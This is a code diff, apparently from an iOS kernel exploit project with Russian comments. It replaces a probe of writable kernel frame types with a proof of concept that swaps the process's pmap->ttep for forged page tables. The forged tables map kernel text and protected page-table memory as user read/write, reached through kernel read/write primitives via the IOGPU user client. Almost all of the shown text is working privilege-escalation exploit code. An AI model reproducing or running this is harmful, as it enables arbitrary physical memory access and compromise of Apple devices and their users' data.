@@ -5341,135 +5341,129 @@ static BOOL kpHuntPtrOK(uint64_t v)
     extern uint64_t kp_rc_kread64(uint64_t);
     extern void kp_rc_kwrite64(uint64_t, uint64_t);
 
-    // 1. IOGPU user client (type 1 — единственный рабочий на 18.6)
-    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOGPU"));
-    if (!svc) { GNOTE( @"FAIL: сервис IOGPU"); gGartLive = NO; return r; }
-    io_connect_t conn = 0;
-    kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 1, &conn);
-    IOObjectRelease(svc);
-    GNOTE( [NSString stringWithFormat:@"  open(1): kr=%#x conn=%#x", kr, conn]);
-    if (kr || !conn) { gGartLive = NO; return r; }
-
-    // 2. цепочка: conn → IOMachPort+0x30 → AGXUC+0xf8 → accel+0xd0 → gart
-    if (![self rcIsTableWithLog:r]) { [r appendString:@"FAIL: is_table\n"]; gGartLive = NO; return r; }
-    uint64_t mp = kp_untag_ptr([self rcResolveThreadKVA:conn]);
-    uint64_t agxuc = kp_untag_ptr(kp_rc_kread64(mp + 0x30));
-    uint64_t accel = kp_untag_ptr(kp_rc_kread64(agxuc + 0xf8));
-    uint64_t gart = kp_untag_ptr(kp_rc_kread64(accel + 0xd0));
-    uint64_t mux = kp_untag_ptr(kp_rc_kread64(gart + 0x288));
-    uint64_t uat = kp_untag_ptr(kp_rc_kread64(mux + 0x10));
-    uint64_t mapper = kp_untag_ptr(kp_rc_kread64(uat + 0x20));
-    uint64_t L1arr = kp_untag_ptr(kp_rc_kread64(mapper + 0x30));
-    GNOTE( [NSString stringWithFormat:@"  цепь: uc=%#llx accel=%#llx gart=%#llx uat=%#llx mapper=%#llx L1arr=%#llx",
-               agxuc, accel, gart, uat, mapper, L1arr]);
-
-    // 3. WRITE-MATRIX v10: 0x0b/0x21 пишутся, 0x0e (kext text) ЗАЩИЩЁН
-    //    (паника v9, pattern 0x4141 в panic-логе). Остались неизведанные
-    //    типы (0x13×7.5k, 0x37×1.6k, 0x06×2.5k…). Сначала сэмплы (read-only,
-    //    идентификация), потом write-тесты без 0x0e. Паника на типе = тип
-    //    защищён (виновник — последняя строка syslog).
-
-    // 3b. frame table enum ЧАНКАМИ (4КБ = 256 записей за read): гистограмма
-    //     типов + мастер-список {ppn,type} + список heap-страниц для sig-скана.
-    uint64_t tableVA = [self frameTableVAWithLog:r];
-    if (!tableVA) { GNOTE( @"FAIL: frame table"); gGartLive = NO; return r; }
-    uint64_t pb = kconstant(physBase), ps = kconstant(physSize);
-    uint32_t totalPages = (uint32_t)(ps >> 14);
-    uint32_t *heapPages = malloc((size_t)totalPages * 4);
-    uint64_t *allPages = malloc((size_t)totalPages * 8);
-    if (!heapPages || !allPages) { GNOTE( @"FAIL: malloc"); gGartLive = NO; return r; }
-    uint32_t nheap = 0, nall = 0;
-    uint32_t typeCount[256]; memset(typeCount, 0, sizeof(typeCount));
-    {
-        uint8_t fch[0x1000];
-        for (uint32_t base = 0; base < totalPages; base += 256) {
-            uint32_t n = totalPages - base; if (n > 256) n = 256;
-            kreadbuf(tableVA + (uint64_t)base * 16, fch, (size_t)n * 16);
-            for (uint32_t j = 0; j < n; j++) {
-                uint8_t ft = fch[j * 16 + 2];
-                typeCount[ft]++;
-                allPages[nall++] = (uint64_t)(base + j) | ((uint64_t)ft << 32);
-                if (ft == 0x21 || ft == 0x0b) heapPages[nheap++] = base + j;
-            }
-            if (base && (base & 0xFFFF) == 0)
-                GNOTE( [NSString stringWithFormat:@"  enum: %u/%u страниц…", base, totalPages]);
-        }
-    }
-    {
-        NSMutableString *hist = [NSMutableString string];
-        for (int t = 0; t < 256; t++) if (typeCount[t]) [hist appendFormat:@"0x%02x×%u ", t, typeCount[t]];
-        GNOTE( [NSString stringWithFormat:@"  frame types: %@", hist]);
-    }
-    GNOTE( [NSString stringWithFormat:@"  heap/userland страниц: %u", nheap]);
-
-    // 3c. write-test — ТОЧЕЧНО: 0x21 (контроль), 0x11 (page-table-подобный,
-    //     phys|0x3 — джекпот если пишется), 0x09/0x18 (нули). 0x37 ИСКЛЮЧЁН:
-    //     запись туда = мгновенный EL2-ресет SoC без panic-лога (v12).
-    //     0x0e/0x06 (текст), 0x13/0x14 (read-fault), 0x17/0x02 — тоже нет.
+    // === TTBR0 swap PoC: подмена pmap->ttep на фейк-таблицу в user-странице.
+    //    Write-matrix закрыта (запись в "нулевой qword" heap-страницы = рулетка
+    //    с живыми null-полями). struct pmap — heap-объект; если он 0x21
+    //    (пишется), свапаем корень TTBR0 нашего процесса на СВОИ таблицы →
+    //    мапим любой phys как user RW. TTBR1 (ядро) не трогаем: максимум —
+    //    крэш приложения, не девайса.
+    extern uint64_t kp_rc_kread64(uint64_t);
     extern void kp_rc_kwrite64(uint64_t, uint64_t);
-    static const uint8_t wtest[] = { 0x21, 0x11, 0x09, 0x18 };
-    for (int wi = 0; wi < (int)sizeof(wtest); wi++) {
-        uint8_t t = wtest[wi];
-        if (!typeCount[t]) continue;
-        GNOTE( [NSString stringWithFormat:@"  write-test типа 0x%02x (%u страниц)…", t, typeCount[t]]);
-        BOOL done = NO;
-        uint32_t tried = 0;
-        for (uint32_t i = 0; i < nall && tried < 8 && !done; i++) {
-            if ((uint32_t)(allPages[i] >> 32) != t) continue;
-            tried++;
-            uint64_t pa = pb + ((uint64_t)(uint32_t)allPages[i] << 14);
-            uint64_t va = gPrimitives.phystokv(pa);
-            uint8_t pgch[0x1000];
-            int zslot = -1;
-            for (int seg = 0; seg < 4 && zslot < 0; seg++) {
-                kreadbuf(va + (uint64_t)seg * 0x1000, pgch, 0x1000);
-                for (int q = 0; q < 512; q++) {
-                    uint64_t v;
-                    memcpy(&v, pgch + q * 8, 8);
-                    if (!v) { zslot = seg * 512 + q; break; }
-                }
-            }
-            if (zslot < 0) continue;
-            uint64_t slotVA = va + (uint64_t)zslot * 8;
-            GNOTE( [NSString stringWithFormat:@"    нулевой qword: page=%#llx slot=%d", pa, zslot]);
-            kp_rc_kwrite64(slotVA, 0x4141414141414141ULL);
-            uint64_t rb = kp_rc_kread64(slotVA);
-            BOOL stuck = (rb == 0x4141414141414141ULL);
-            kp_rc_kwrite64(slotVA, 0);
-            uint64_t rb2 = kp_rc_kread64(slotVA);
-            GNOTE( [NSString stringWithFormat:@"    → 0x%02x %@ (rb=%#llx, restore=%#llx)", t,
-                       stuck ? @"ПИШЕТСЯ ★★★" : @"не пишется (молча)", rb, rb2]);
-            done = YES;
-        }
-        if (!done) GNOTE( [NSString stringWithFormat:@"    → 0x%02x: нулевого qword не нашлось за 8 страниц", t]);
-    }
+    extern uint64_t vtophys(uint64_t, uint64_t);
 
-    // 3d. сэмплы оставшихся read-unknown типов (read-only; read-fault на
-    //     типе = исключаем его в следующей сборке — виновник последней
-    //     строкой syslog). 0x13/0x14 уже read-fault — не трогаем.
-    static const uint8_t sampleT[] = {0x0c, 0x10, 0x01, 0x27, 0x30, 0x34, 0x35, 0x36, 0x02};
-    for (int si = 0; si < (int)sizeof(sampleT); si++) {
-        uint8_t t = sampleT[si];
-        if (!typeCount[t]) continue;
-        uint32_t shown = 0;
-        for (uint32_t i = 0; i < nall && shown < 2; i++) {
-            if ((uint32_t)(allPages[i] >> 32) != t) continue;
-            uint64_t pa = pb + ((uint64_t)(uint32_t)allPages[i] << 14);
-            uint8_t sm[0x40];
-            kreadbuf(gPrimitives.phystokv(pa), sm, 0x40);
-            NSMutableString *s = [NSMutableString stringWithFormat:@"  0x%02x сэмпл %#llx:", t, pa];
-            for (int q = 0; q < 8; q++) {
-                uint64_t v;
-                memcpy(&v, sm + q * 8, 8);
-                [s appendFormat:@" %#llx", v];
-            }
-            GNOTE( s);
-            shown++;
+    // 1. self thread → tro → proc → proc_ro → task → map → pmap → ttep
+    mach_port_t tp = mach_thread_self();
+    uint64_t tva = [self rcResolveThreadKVA:tp];
+    mach_port_deallocate(mach_task_self(), tp);
+    uint64_t tro = kp_untag_ptr(kp_rc_kread64(tva + 0x3E8));
+    uint64_t sproc = kp_untag_ptr(kp_rc_kread64(tro + off_thread_ro_tro_proc));
+    uint64_t pro = kp_untag_ptr(kp_rc_kread64(sproc + off_proc_p_proc_ro));
+    uint64_t stask = kp_untag_ptr(kp_rc_kread64(pro + off_proc_ro_pr_task));
+    uint64_t smap = kp_untag_ptr(kp_rc_kread64(stask + off_task_map));
+    uint64_t spmap = kp_untag_ptr(kp_rc_kread64(smap + koffsetof(vm_map, pmap)));
+    uint64_t ttep = kp_untag_ptr(kp_rc_kread64(spmap + koffsetof(pmap, ttep)));
+    GNOTE( [NSString stringWithFormat:@"  self: pmap=%#llx ttep=%#llx", spmap, ttep]);
+    if (!kpLooksLikeKernelPointer(spmap) || !ttep) { GNOTE( @"FAIL: pmap/ttep"); gGartLive = NO; return r; }
+
+    // 2. тип pmap-страницы: только 0x21 (heap) гарантированно пишется
+    uint64_t tableVA = [self frameTableVAWithLog:r];
+    int pmapType = kpVAType(spmap, tableVA);
+    GNOTE( [NSString stringWithFormat:@"  frame type pmap = 0x%x %@", pmapType,
+               pmapType == 0x21 ? @"(heap — ПИШЕТСЯ, идём)" : @"(НЕ heap — СТОП, записей не будет)"]);
+    if (pmapType != 0x21) { gGartLive = NO; return r; }
+
+    // 3. три user-страницы под фейк-таблицы (L1/L2/L3)
+    vm_address_t base = 0;
+    if (vm_allocate(mach_task_self(), &base, 0xC000, VM_FLAGS_ANYWHERE) != KERN_SUCCESS ||
+        mlock((void *)base, 0xC000) != 0) { GNOTE( @"FAIL: vm_allocate/mlock"); gGartLive = NO; return r; }
+    memset((void *)base, 0, 0xC000);
+    uint64_t paL1f = vtophys(ttep, base);
+    uint64_t paL2f = vtophys(ttep, base + 0x4000);
+    uint64_t paL3f = vtophys(ttep, base + 0x8000);
+    GNOTE( [NSString stringWithFormat:@"  fake tables: VA=%#llx L1pa=%#llx L2pa=%#llx L3pa=%#llx",
+               (uint64_t)base, paL1f, paL2f, paL3f]);
+    if (!paL1f || !paL2f || !paL3f) { GNOTE( @"FAIL: vtophys fake tables"); goto out_free; }
+
+    {
+        // 4. копия реального L1 + шаблоны attrs из живой цепи нашей страницы
+        uint64_t l1va = gPrimitives.phystokv(ttep);
+        kreadbuf(l1va, (void *)base, 0x4000);
+        uint64_t i1 = (base >> 36) & 0x7FF, i2 = (base >> 25) & 0x7FF, i3 = (base >> 14) & 0x7FF;
+        uint64_t e1 = kp_rc_kread64(l1va + i1 * 8);
+        uint64_t aT = e1 & ~0xFFFFFFFFF000ULL;
+        uint64_t e2 = kp_rc_kread64(gPrimitives.phystokv(e1 & 0xFFFFFFFFF000ULL) + i2 * 8);
+        uint64_t pte = kp_rc_kread64(gPrimitives.phystokv(e2 & 0xFFFFFFFFF000ULL) + i3 * 8);
+        uint64_t aP = pte & ~0xFFFFFFFFF000ULL;
+        GNOTE( [NSString stringWithFormat:@"  attrs: table=%#llx page=%#llx (шаблон pte=%#llx)", aT, aP, pte]);
+        if (!(aT & 1) || !(aP & 1)) { GNOTE( @"FAIL: attrs шаблон невалиден"); goto out_free; }
+
+        // 5. пустой слот в реальном L1 (копия его унаследует)
+        int slot = -1;
+        for (int i = 96; i < 2048; i++)
+            if (kp_rc_kread64(l1va + (uint64_t)i * 8) == 0) { slot = i; break; }
+        if (slot < 0) { GNOTE( @"FAIL: нет пустого L1 слота"); goto out_free; }
+        uint64_t targetVA = (uint64_t)slot << 36;
+        GNOTE( [NSString stringWithFormat:@"  пустой слот L1[%d] → targetVA=%#llx", slot, targetVA]);
+
+        // 6. фейк-цепочка: kernel text page + реальный L1 root (защищённый тип)
+        uint64_t targetPA = kvtophys(kconstant(base));
+        uint64_t *L1f = (uint64_t *)base;
+        uint64_t *L2f = (uint64_t *)(base + 0x4000);
+        uint64_t *L3f = (uint64_t *)(base + 0x8000);
+        L1f[slot] = paL2f | aT;
+        L2f[0] = paL3f | aT;
+        L3f[0] = (targetPA & 0xFFFFFFFFF000ULL) | aP;   // kernel text
+        L3f[1] = (ttep & 0xFFFFFFFFF000ULL) | aP;       // реальный L1 root (тип защищён?)
+        GNOTE( [NSString stringWithFormat:@"  цепь: L1f[%d]=%#llx L2f[0]=%#llx L3f[0]=%#llx L3f[1]=%#llx",
+                   slot, L1f[slot], L2f[0], L3f[0], L3f[1]]);
+
+        // 7. СВАП → чтения → зачистка форжа → restore. Между свапом и
+        //    restore — НИКАКИХ логов/аллокаций (page fault пошёл бы в pmap
+        //    код по фейк-таблицам).
+        GNOTE( [NSString stringWithFormat:@"  СВАПАЮ pmap->ttep: %#llx → %#llx", ttep, paL1f]);
+        uint64_t v0 = 0, v1 = 0;
+        kp_rc_kwrite64(spmap + koffsetof(pmap, ttep), paL1f);
+        usleep(100000);
+        v0 = *(volatile uint64_t *)targetVA;
+        v1 = *(volatile uint64_t *)(targetVA + 0x4000);
+        L1f[slot] = 0; L2f[0] = 0; L3f[0] = 0; L3f[1] = 0;   // fake L1 == копии реального (teardown-safe)
+        kp_rc_kwrite64(spmap + koffsetof(pmap, ttep), ttep);
+        usleep(50000);
+        uint64_t realE0 = kp_rc_kread64(l1va);
+        GNOTE( [NSString stringWithFormat:@"  ЧТЕНИЕ kernel text через фейк: %#llx %@",
+                   v0, v0 == 0x100000cfeedfacfULL ? @"★★★ ПОБЕДА — произвольный phys как user RW! ★★★" : @"(не kernel text)"]);
+        GNOTE( [NSString stringWithFormat:@"  ЧТЕНИЕ L1 root[0] через фейк: %#llx · апертура: %#llx · %@",
+                   v1, realE0, v1 == realE0 ? @"★★★ ЗАЩИЩЁННЫЕ СТРАНИЦЫ ДОСТУПНЫ КАК USER ★★★" : @"(не сошлось)"]);
+        GNOTE( @"  ttep восстановлен");
+
+        // 8. если чтение работает — пробуем ЗАПИСЬ в безопасную цель: своя же
+        //    страница-мишень (vm_allocate X, мапим её PA вторым слотом, пишем
+        //    через фейк-VA, читаем через настоящий VA). Полный круг r/w.
+        vm_address_t xt = 0;
+        if (v0 == 0x100000cfeedfacfULL &&
+            vm_allocate(mach_task_self(), &xt, 0x4000, VM_FLAGS_ANYWHERE) == KERN_SUCCESS &&
+            mlock((void *)xt, 0x4000) == 0) {
+            memset((void *)xt, 0, 0x4000);
+            uint64_t paX = vtophys(ttep, xt);
+            L3f[0] = (paX & 0xFFFFFFFFF000ULL) | aP;
+            L1f[slot] = paL2f | aT; L2f[0] = paL3f | aT;
+            GNOTE( [NSString stringWithFormat:@"  СВАП#2: запись в мишень X pa=%#llx через фейк", paX]);
+            kp_rc_kwrite64(spmap + koffsetof(pmap, ttep), paL1f);
+            usleep(100000);
+            *(volatile uint64_t *)targetVA = 0x1337133713371337ULL;
+            uint64_t chk = *(volatile uint64_t *)xt;
+            L1f[slot] = 0; L2f[0] = 0; L3f[0] = 0;
+            kp_rc_kwrite64(spmap + koffsetof(pmap, ttep), ttep);
+            usleep(50000);
+            GNOTE( [NSString stringWithFormat:@"  ЗАПИСЬ через фейк → чтение через настоящий VA: %#llx %@",
+                       chk, chk == 0x1337133713371337ULL ? @"★★★ ПОЛНЫЙ КРУГ: запись в любой phys! ★★★" : @"(не прилипло)"]);
+            munlock((void *)xt, 0x4000);
+            vm_deallocate(mach_task_self(), xt, 0x4000);
         }
     }
-
-    free(heapPages); free(allPages);
-    GNOTE( @"  write-matrix v12 завершена");
+out_free:
+    munlock((void *)base, 0xC000);
+    vm_deallocate(mach_task_self(), base, 0xC000);
     gGartLive = NO;
     return r;
 }
